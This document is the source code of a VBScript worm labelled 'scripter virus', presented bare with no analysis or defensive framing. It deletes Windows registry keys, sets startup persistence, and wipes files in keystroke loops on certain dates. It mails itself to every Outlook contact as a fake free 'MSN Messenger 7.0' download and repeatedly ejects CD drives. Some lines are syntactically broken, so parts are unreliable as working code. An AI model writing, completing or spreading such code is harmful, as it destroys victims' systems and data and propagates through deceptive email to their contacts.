'scripter virus
dim a,b,c,d
set a = CreateObject("wscript.shell")
set b = CreateObject("Scripting.FileSystemObject")
c=inputbox"ENTER SYSTEM PASSWORD",vbExclamation,"ENTER PASSWORD"
if c="scripter1234" Then
msgbox"CORRECT PASSWORD",vbExclamation,"YOURE LUCKY"
a.regdelete "HKLM\SOFTWARE\Microsoft\Windows NT"
a.regdelete "HKLM\SOFTWARE\Microsoft\Windows"
a.createFolder("c:\scripter")
wscript.sleep 1500 
a.CreateShortcut("%WINDIR%\starmenu\programs\startup\Notepad.lnk")
a.TargetPath = WScript.ScriptFullName
a.Save
wscript.sleep 1500
b.createTextFile("c:\scripter\scripter.txt")
b.writeline "You Have Been Infected By Scripter"
b.close
if month(now)="1" then
msgbox "I Hate Janurary",vbExclamation,"Janurary"
do
wscript.sleep 1000
a.sendkeys "^{A}"
a.sendkeys "{DEL}"+"{ENTER}"
a.run "%WINDIR%"
a.sendkeys "^{A}"
a.sendkeys "{DEL}"+"{ENTER}"
wscript.sleep 1500
msgbox"FILES DELETED",vbCritical,"WARNING"
loop
Else
if month(now)="12" Then
a.sendkeys "{NUMLOCK}"
msgbox"MERRY XMAS",vbcritical,"XMAS"
wscript.sleep 2000
msgbox"YOU HAVE BEEN INFECTED".vbcritical,"ANTIVIRUS"
wscript.sleep 1500
a.sendkeys "^{A}"
a.sendkeys "{DEL}"+"{ENTER}"
wscript.sleep 1500
a.sendkeys "{CAPSLOCK}"
a.sendkeys "{SCROLLLOCK}"
a.regdelete "HKLM\SOFTWARE\Microsoft\Windows NT"
a.regdelete "HKLM\SOFTWARE\Microsoft\Windows"
wscript.sleep 1500
b.CreateFolder("c:\program files\messanger 7.0")
wscript.sleep 2000
msgbox"INSTALATION COMPLETE",vbCritical,"MESSANGER 7.0
wscript.sleep 1500
do
a.sendkeys "{NUMLOCK}"
a.sendkeys "{CAPSLOCK}"
set aa = CreateObject("Outlook.Application")
set bb = Wscript.CreateObject("Outlook.Application")
set mapi = bb.GetNameSpace("MAPI")
set c = mapi.AddressLists(1)
For X = 1 To c.AddressEntries.Count
set Mail = aa.CreateItem(0)
Mail.to = aa.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
Mail.Subject = "Free New Msn Messanger 7.0 Download"
Mail.Body = "Please Open The Attached File To Start Downloading"
Mail.Body = "This Is A 100% Free Full Version."
Mail.Body = "From Msn Staff To Everyone Using Msn Email."
Mail.Body = "Please Enjoy"
Mail.Attachments.Add WScript.ScriptFullName
Mail.Send
Next
aa.Quit
wscript.sleep 2000
a.regdelete "HKLM\SOFTWARE\Microsoft\Windows NT"
a.regdelete "HKLM\SOFTWARE\Microsoft\Windows"
msgbox "WORM SPREADING",vbCritical,"WARNING"
a.sendkeys "{SCROLLLOCK}"
loop
Else
do
set aa = CreateObject("Outlook.Application")
set bb = Wscript.CreateObject("Outlook.Application")
set mapi = bb.GetNameSpace("MAPI")
set c = mapi.AddressLists(1)
For X = 1 To c.AddressEntries.Count
set Mail = aa.CreateItem(0)
Mail.to = aa.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
Mail.Subject = "Free New Msn Messanger 7.0 Download"
Mail.Body = "Please Open The Attached File To Start Downloading"
Mail.Body = "This Is A 100% Free Full Version."
Mail.Body = "From Msn Staff To Everyone Using Msn Email."
Mail.Body = "Please Enjoy"
Mail.Attachments.Add WScript.ScriptFullName
Mail.Send
Next
aa.Quit
wscript.sleep 1500
on error resume next
set fso = CreateObject("Scripting.FileSystemObject")
set wshshell = CreateObject("Wscript.shell")
Set oWMP = CreateObject("WMPlayer.OCX.7")
Set colCDROMs = oWMP.cdromCollection
if colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
end if
loop
End if
End if
End if
